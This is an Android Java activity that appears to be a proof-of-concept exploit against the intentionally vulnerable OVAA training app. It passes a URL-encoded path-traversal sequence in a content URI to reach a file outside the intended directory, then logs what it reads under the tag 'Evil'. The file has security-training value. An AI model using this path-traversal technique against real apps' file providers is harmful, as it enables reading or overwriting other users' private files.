package com.example.test;

import androidx.appcompat.app.AppCompatActivity;

import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Uri uri = Uri.parse("content://oversecured.ovaa.theftoverwrite/..%2fobb%2fdt.txt");
        ParcelFileDescriptor p = openFile(uri);
        assert p != null;
        assert p.getStatSize() <= Integer.MAX_VALUE;
        byte[] data = new byte[(int) p.getStatSize()];
        FileDescriptor fd = p.getFileDescriptor();
        FileInputStream fileStream = new FileInputStream(fd);
        try {
            fileStream.read(data);
            String st = new String(data);
            Log.d("Evil",st);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public ParcelFileDescriptor openFile(Uri uri){
        File file  = new File(Environment.getExternalStorageDirectory(), uri.getLastPathSegment());
        Log.d("Reading File",String.valueOf(file));
        ParcelFileDescriptor pfd;
        try {
            pfd=ParcelFileDescriptor.open(file,805306368);
        }
        catch (  FileNotFoundException e) {
            e.printStackTrace();
            return null;
        }
        return pfd;
    }
}